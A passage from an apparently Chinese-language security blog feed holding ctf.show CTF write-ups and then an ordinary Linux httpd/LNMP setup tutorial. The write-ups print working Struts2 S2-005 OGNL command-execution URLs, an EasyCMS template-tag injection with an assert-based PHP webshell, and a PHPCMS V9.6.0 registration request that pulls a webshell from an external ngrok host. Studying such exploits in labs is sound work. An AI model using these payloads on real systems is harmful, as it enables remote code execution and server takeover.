class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在src下新建软件包名为com.demo.action在action目录下新建LoginAction的java类</p><p>LoginAction.java</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.demo.action;</span><br><span class="line"></span><br><span class="line">import com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line">public class LoginAction extends ActionSupport &#123;</span><br><span class="line">    private String username = null;</span><br><span class="line">    private String password = null;</span><br><span class="line"></span><br><span class="line">    public String getUsername() &#123;</span><br><span class="line">        return this.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPassword() &#123;</span><br><span class="line">        return this.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUsername(String username) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPassword(String password) &#123;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String execute() throws Exception &#123;</span><br><span class="line">        if ((this.username.isEmpty()) || (this.password.isEmpty())) &#123;</span><br><span class="line">            return &quot;error&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if ((this.username.equalsIgnoreCase(&quot;admin&quot;))</span><br><span class="line">                &amp;&amp; (this.password.equals(&quot;admin&quot;))) &#123;</span><br><span class="line">            return &quot;success&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在src目录下创建struts.xml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span><br><span class="line">        &quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;&gt;</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">    &lt;package name=&quot;S2-001&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">        &lt;action name=&quot;login&quot; class=&quot;com.demo.action.LoginAction&quot;&gt;</span><br><span class="line">            &lt;result name=&quot;success&quot;&gt;welcome.jsp&lt;/result&gt;</span><br><span class="line">            &lt;result name=&quot;error&quot;&gt;index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;/action&gt;</span><br><span class="line">    &lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203302231033.png"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203302233080.png" alt="image-20220330223336985"></p><p>太菜了,分析不明白</p><h1 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h1><p>poc 这个漏洞的具体原理不知道,但是利用方式是先传poc,在使用struts2scan去利用,如果不先传poc是无法扫描成功的,具体改的位置就是 id查找一下id</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-005/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27id%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-005/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27---id----%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311314171.png" alt="image-20220331131434036"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-005/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27ls%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311317092.png" alt="image-20220331131738952"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311324949.png" alt="image-20220331132426843"></p><p>记得先传poc哦 工具扫出来是016漏洞</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311321854.png" alt="image-20220331132108793"></p><p>找了一下在env</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311323078.png" alt="image-20220331132313003"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMS</title>
      <link href="/ctfshow/ctf.show/CMS/"/>
      <url>/ctfshow/ctf.show/CMS/</url>
      
        <content type="html"><![CDATA[<h1 id="web477"><a href="#web477" class="headerlink" title="web477"></a>web477</h1><p>题目提示rce</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292008555.png" alt="image-20220329200851338"></p><p>是easycms的</p><p>去网站搜搜,搜到后台地址是admin.<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292029840.png" alt="image-20220329202954637"></p><p>弱口令admin admin登进去了</p><p>网上查了一下是5.7的版本,然后找一下漏洞</p><p>漏洞文件位置：&#x2F;lib&#x2F;table&#x2F;table_templatetagwap.php 第3-20行：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">table_templatetag</span> <span class="keyword">extends</span> <span class="title">table_mode</span> </span>&#123;  </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">if</span>(!front::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;name&#x27;</span>)) &#123;  </span><br><span class="line">             front::<span class="title function_ invoke__">flash</span>(<span class="string">&#x27;请填写名称！&#x27;</span>);  </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">         &#125;  </span><br><span class="line">  <span class="keyword">if</span>(!front::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;tagcontent&#x27;</span>)) &#123;  </span><br><span class="line">             front::<span class="title function_ invoke__">flash</span>(<span class="string">&#x27;请填写内容！&#x27;</span>);  </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">save_before</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line"> <span class="keyword">if</span>(!front::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;tagfrom&#x27;</span>)) front::<span class="variable">$post</span>[<span class="string">&#x27;tagfrom&#x27;</span>]=<span class="string">&#x27;define&#x27;</span>;  </span><br><span class="line"> <span class="keyword">if</span>(!front::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;attr1&#x27;</span>)) front::<span class="variable">$post</span>[<span class="string">&#x27;attr1&#x27;</span>]=<span class="string">&#x27;0&#x27;</span>;  </span><br><span class="line"> <span class="keyword">if</span>(front::<span class="variable">$post</span>[<span class="string">&#x27;tagcontent&#x27;</span>]) front::<span class="variable">$post</span>[<span class="string">&#x27;tagcontent&#x27;</span>] =         <span class="title function_ invoke__">htmlspecialchars_decode</span>(front::<span class="variable">$post</span>[<span class="string">&#x27;tagcontent&#x27;</span>]);  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>可以看到在写入文件之前,使用htmlsprcialchars_decode函数把预定义的html实体”&lt;”和”&gt;”大于转换为字符,因此我们可以使用双引号闭合,从而构造出payload写入文件,进一步触发代码,导致程序在现实上存在代码执行漏洞,攻击者可以通过构造恶意脚本代码写入配置文件,从而执行命令,控制网站服务器权限.</p><p>利用</p><ol><li>登录后台,模板-自定义标签-添加自定义标签-填写payload-提交</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">111&quot;;&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292048605.png" alt="image-20220329204815544"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292050326.png" alt="image-20220329205020283"></p><p>​    2.保存提交后,点击预览,成功触发代码,或者查看id的值,然后直接访问文件路径:</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292050708.png" alt="image-20220329205040655"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292054883.png" alt="image-20220329205402855"></p><p>​    3.使用别人的绕过过滤的一句话木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11&quot;;&#125;&lt;?php assert($_POST[zf]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292118216.png" alt="image-20220329211842180"></p><p>但是发现连不上,可能存在过滤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292121539.png" alt="image-20220329212120484"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292121035.png" alt="image-20220329212134989"></p><p>上传一般一句话木马的时候有过滤,在phpinfo页面curl + f 查找下flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292114380.png" alt="image-20220329211453351"></p><h1 id="web478"><a href="#web478" class="headerlink" title="web478"></a>web478</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312048610.png" alt="image-20220331204835567"></p><p>这里有提示安装地址哦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5a4353d3-1ab1-481f-87af-ff6ce895dd9b.challenge.ctf.show/install/install.php</span><br></pre></td></tr></table></figure><p>phpcms v9</p><p>看看有没有逻辑漏洞</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312050348.png" alt="image-20220331205003246"></p><p>php版本</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312052714.png" alt="image-20220331205222577"></p><p>几个可写路径</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312054059.png" alt="image-20220331205423918"></p><p>填上数据库</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312055688.png" alt="image-20220331205531591"></p><p>后台</p><p>cms的具体版本Phpcms V9.6.0  </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312057028.png" alt="image-20220331205659917"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312057774.png" alt="image-20220331205733703"></p><p>就是你了</p><p>这里需要一个公网ip,我没有,这里使用代理工具<a href="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz">ngrok</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312127649.png" alt="image-20220331212735598"></p><p>解压</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312127719.png" alt="image-20220331212749649"></p><p>加一下这里的授权码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312128326.png" alt="image-20220331212816253"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312129602.png" alt="image-20220331212903542"></p><p>开启代理<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312129483.png" alt="image-20220331212948427"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312129493.png" alt="image-20220331212935334"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312140528.png" alt="image-20220331214003493"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312139971.png" alt="image-20220331213950913"></p><p>编辑一个txt文件在web服务中,并写入一句话木马</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312141563.png" alt="image-20220331214108522"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312143073.png" alt="image-20220331214334988"></p><p>注册的时候抓包,将这个下面构造的放到info后面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=test2&amp;password=test2123&amp;email=test2@163.com&amp;info[content]=&lt;img src=http://5edc-112-38-217-12.ngrok.io/wanan.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure><p>把这个替换一下,测试直接发送burp抓到的是没办法执行的,鬼知道什么原因,等我有时间了在分析,反正就是该删的删</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=http://5edc-112-38-217-12.ngrok.io/wanan.txt?.php#.jpg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312155553.png" alt="image-20220331215513458"></p><p>回显了一个php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312156906.png" alt="image-20220331215625769"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312156006.png" alt="image-20220331215641929"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312156521.png" alt="image-20220331215658454"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux操作学习(六)</title>
      <link href="/Linux/Linux/Linxe-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E5%85%AD)/"/>
      <url>/Linux/Linux/Linxe-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E5%85%AD)/</url>
      
        <content type="html"><![CDATA[<h1 id="linux操作学习-六"><a href="#linux操作学习-六" class="headerlink" title="linux操作学习(六)"></a>linux操作学习(六)</h1><h2 id="配置软件仓库"><a href="#配置软件仓库" class="headerlink" title="配置软件仓库"></a>配置软件仓库</h2><p>软件仓库是一种能进一步简化RPM管理软件的难度以及自动分析所需软件包及其依赖关系的技术。可以把Yum或DNF想象成是一个硕大的软件仓库，里面保存有几乎所有常用的工具，而且只需要说出所需的软件包名称，系统就会自动为您搞定一切。</p><p>既然要使用软件仓库，就要先把它搭建起来，然后将其配置规则确定好才行。</p><p>Yum与DNF软件仓库的配置文件是通用的，也就是说填写好配置文件信息后，这两个软件仓库的命令都是可以正常使用</p><ol><li>进入&#x2F;etc&#x2F;yum.repos.d&#x2F;目录中(因为该目录存放着软件仓库的配置文件)</li><li>使用vim编辑器创建一个名为centos.repo的新配置文件(文件名随意,但是后缀必须为.repo)逐项写入下面的配置参数并保存退出.<ul><li>仓库名称:具有唯一性的标识名称,不应与其他软件仓库发生冲突</li><li>描述信息(name):可以是一些介绍性的词,可以使用FTP或者HTTP下载,也可以是本地文件(需要在后面添加file参数)</li><li>是否启用(enabled):设置此源是否可用;1为可用,0为禁用</li><li>是否校验(gbgcheck):设置此源是否校验文件;1为校验,0为不校验</li><li>公钥位置(gbgkey):若上面的参数开启了校验功能,则此处为公钥文件位置.若没有开启,则省略不写</li></ul></li><li>按照配置参数中所填写的仓库位置挂载光盘,并把光盘挂载信息写入&#x2F;etc&#x2F;fstab文件中</li><li>使用”dnf install httpd -y”命令检查软件仓库是否已经可用</li></ol><p>安装httpd(可能不对)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241648905.png" alt="image-20220324164851853"></p><p>启动httpd服务程序并将其加入到开机启动项中,使其能够随着系统的开机而运行,从而持续为用户提供web服务</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241650775.png" alt="image-20220324165010728"></p><p>打开浏览器访问80端口</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241656492.png" alt="image-20220324165601382"></p><h3 id="配置服务文件参数"><a href="#配置服务文件参数" class="headerlink" title="配置服务文件参数"></a>配置服务文件参数</h3><p>在linux系统中配置服务,其实就是在修改服务的配置文件.因此还需要知道这些配置文件的所在位置及其用途.</p><p> Linux系统中的配置文件</p><table><thead><tr><th>作用</th><th>文件名称</th></tr></thead><tbody><tr><td>服务目录</td><td>&#x2F;etc&#x2F;httpd</td></tr><tr><td>主配置文件</td><td>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</td></tr><tr><td>网站数据目录</td><td>&#x2F;var&#x2F;www&#x2F;html</td></tr><tr><td>访问日志</td><td>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</td></tr><tr><td>错误日志</td><td>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</td></tr></tbody></table><p>主配置文件中保存的是最重要的服务参数,一般会被保存到&#x2F;etc目录中以软件名称命名的一个文件夹中,名字为”服务名称.cong”,例如治理的”&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf”</p><p>打开配置文件,所有以(#)开始的行都是注释行,其目的是对httpd服务程序的功能或者某一行参数进行介绍.</p><p>在httpd服务程序的主配置文件中,存在三种类型的信息:注释行信息 全局配置 区域配置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241703413.png" alt="image-20220324170318342"></p><p>全局配置参数就是一种全局性的配置参数,可以用作于所有的子站点,即保证了子站点的正常访问,也有效降低了频繁写入重复参数的工作量.区域配置参数则是单独针对没做独立的子站点进行设置的.</p><p>  配置httpd服务程序时最常用的参数以及用途描述</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>ServerRoot</td><td>服务目录</td></tr><tr><td>ServerAdmin</td><td>管理员邮箱</td></tr><tr><td>User</td><td>运行服务的用户</td></tr><tr><td>Group</td><td>运行服务的用户组</td></tr><tr><td>ServerName</td><td>网站服务器的域名</td></tr><tr><td>DocumentRoot</td><td>网站数据目录</td></tr><tr><td>Listen</td><td>监听的IP地址与端口号</td></tr><tr><td>DirectoryIndex</td><td>默认的索引页页面</td></tr><tr><td>ErrorLog</td><td>错误日志文件</td></tr><tr><td>CustomLog</td><td>访问日志文件</td></tr><tr><td>Timeout</td><td>网页超时时间，默认为300秒</td></tr></tbody></table><p>DocumentRoot参数用于定义网站数据的保存路径,其参数的默认值是&#x2F;var&#x2F;www&#x2F;html(即把网站数据存放到这个目录中);而当前网站普通的首页面名称是index.html,因此可以向&#x2F;var&#x2F;www&#x2F;html&#x2F;index.html文件中写入一段内容,替换掉httpd服务程序的默认首页.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241737421.png" alt="image-20220324173710373"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241737073.png" alt="image-20220324173720024"></p><p>在默认情况下,网站数据保存在&#x2F;var&#x2F;www&#x2F;html目录中,如果想把保存网站数据的目录修改为&#x2F;home&#x2F;wwwroot目录</p><ol><li><p>创建网站数据的保存目录,并创建首页文件</p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241740246.png"></p></li><li><p>打开httpd服务程序的主配置文件,将用于定义网站数据保存路径参数DocumentRoot修改为&#x2F;home&#x2F;wwwroot,同时还需要将用于定义目录权限的参数Directory后面的路径也修改为&#x2F;home&#x2F;wwwroot.配置文件修改完毕之后即可保存并退出<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241749069.png" alt="image-20220324174919017"></p></li><li><p>重新启动httpd服务程序并验证效果<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241751106.png" alt="image-20220324175153057"></p></li></ol><h1 id="使用LNMP架构部署动态网站环境"><a href="#使用LNMP架构部署动态网站环境" class="headerlink" title="使用LNMP架构部署动态网站环境"></a>使用LNMP架构部署动态网站环境</h1><h2 id="源码包程序"><a href="#源码包程序" class="headerlink" title="源码包程序"></a>源码包程序</h2><p>源码包的可移植性非常好，几乎可以在任何Linux系统中安装使用，而RPM软件包是针对特定系统和架构编写的指令集，必须严格地符合执行环境才能顺利安装（即只会去“生硬地”安装服务程序）。</p><p>使用源码包安装服务程序时会有一个编译过程，因此能够更好地适应安装主机的系统环境，运行效率和优化程度都会强于使用RPM软件包安装的服务程序。也就是说，可以将采用源码包安装服务程序的方式看作是针对系统的“量体裁衣”</p><ol><li>下载及解压源码包文件,为了方便在网络中传输,源码包文件通常会在归档后使用gzip或者bzip2等格式进行压缩,因此一般会就要.tar.gz或者.tar.bz2的后缀,想要使用源码包安装服务程序,必须先把里面的内容解压出来,然后再切换到源码包文件的目录中<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241812207.png" alt="image-20220324181257153"></li><li>编译源码包代码,在正式使用源码包安装服务程序之前,还需要使用编译脚本针对当前系统进行一系列的评估工作,包括对源码包文件 软件之间及函数库之间的依赖关系 编译器 汇编器及链接器进行检查.我们还可以根据需要来追加 –prefix参数,以指定稍后的源码包程序的安装路径,从而对服务程序的安装过程更加可控.当编译工作结束之后,如果系统环境符合安装要求,一般会自动在当前目录下生成一个makefile安全文件<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241817179.png" alt="image-20220324181733125"></li><li>生成二进制安装程序,刚生成的Makefile文件中会保存与系统环境 软件依赖关机和安装规则等相关的内容,接下来便可以使用make命令来根据Makefile 文件内容提供的合适规则编译生成出真正可以提供给用户安装服务程序的二进制可执行文件了<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241820045.png" alt="image-20220324182005993"></li><li>运行二进制的服务程序安装包 由于不需要在简称系统环境,也就不需要在编译源码 ,因此运行二进制的服务程序安装包应该速度最快的步骤.如果在源码包编译阶段使用了 –prefix参数,那么此时服务程序就会被安装到那个目;如果没有自行使用参数定义目录的话,一般会被默认安装到&#x2F;usr&#x2F;local&#x2F;bin目录<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241822094.png" alt="image-20220324182246043"></li><li>清理源码包临时文件,由于在安装服务程序的过程中进行了代码编译的工作,因此在安装后目录中会遗留下很多历史垃圾文件,本着尽量不要浪费磁盘存储空间的原则,可以使用make clean命令对临时文件进行彻底的清理<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241824265.png" alt="image-20220324182452218"></li></ol><h2 id="LNMP动态网站架构"><a href="#LNMP动态网站架构" class="headerlink" title="LNMP动态网站架构"></a>LNMP动态网站架构</h2><p>LNMP动态网站部署架构是一套有linux + Nginx + MySQL + PHP组成的动态网站解决方案.LNMP中的字母L是linux系统的意思.</p><p>在使用源码包安装服务的时候需要先让安装主机具备编译程序源码的环境,这需要具备c语言 c++语言 perl语言的编译器,以及支持常见的编译支持数据库程序,因此配置软件仓库</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251254767.png" alt="image-20220325125441652"></p><p>接着还需要从外部网络来获取Nginx MySQL PHP 及WordPress等一系列的安装包.因此需要配置虚拟机使链接到互联网</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251256152.png" alt="image-20220325125649099"></p><p>可以直接使用wget命令下载这些源码包文件.这里将其放到lnmp目录下保存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@linuxprobe ~]# mkdir /lnmp</span><br><span class="line">[root@linuxprobe ~]# cd /lnmp</span><br><span class="line">[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/rpcsvc-proto-1.4.tar.gz</span><br><span class="line">[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/nginx-1.16.0.tar.gz</span><br><span class="line">[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/mysql-8.0.18.tar.xz</span><br><span class="line">[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/php-7.3.5.tar.gz</span><br><span class="line">[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/wordpress.tar.gz</span><br><span class="line">[root@linuxprobe lnmp]# ls</span><br><span class="line">rpcsvc-proto-1.4.tar.gz       nginx-1.16.0.tar.gz   mysql-8.0.18.tar.xz</span><br><span class="line">php-7.3.5.tar.gz              wordpress.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251303390.png" alt="image-20220325130303343"></p><p>rpcsvc-proto是一款包含rcpsvc协议文件的支持软件包名称.rcpsvc协议在或许nginx与mysql服务程序的部署过重中都需要被调用到.想要通过源码包安装服务程序,就一定要严格遵循上面的安装步骤,下载及解压源码包文件 编译源码包代码 生成二进制安装程序 运行二进制的服务程序安装包.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251305930.png" alt="image-20220325130504871"></p><h3 id="配置nginx服务"><a href="#配置nginx服务" class="headerlink" title="配置nginx服务"></a>配置nginx服务</h3><p>nginx服务是一款优秀的部署动态网站的轻量级服务程序</p><ol><li><p>创建用于管理网站服务的系统账户,这次在新建账户时应使用-M参数不创建对应的家目录,以及使用-s参数指定登录后的shell解释器为&#x2F;sbin&#x2F;nologin,确保任何人不能通过这个账号登录主机<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251309674.png" alt="image-20220325130948624"></p></li><li><p>编译nginx网站服务程序,为了能够让网站服务支持更多的功能,需要在编译过程中添加二外的参数,其中较为重要的是使用prefix参数指定服务将被安装到那个目录,方便后面找到和调用它,其次,考虑到https协议使用越来越广泛,索引这里用with-http_ssl_module参数来开启nginx服务的ssl加密模块,以便以后开启https协议功能<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251314499.png" alt="image-20220325131441444"></p><p> 相对来说,编译脚本文件(configure)比生成二进制文件(make)要快,而安装程序(make 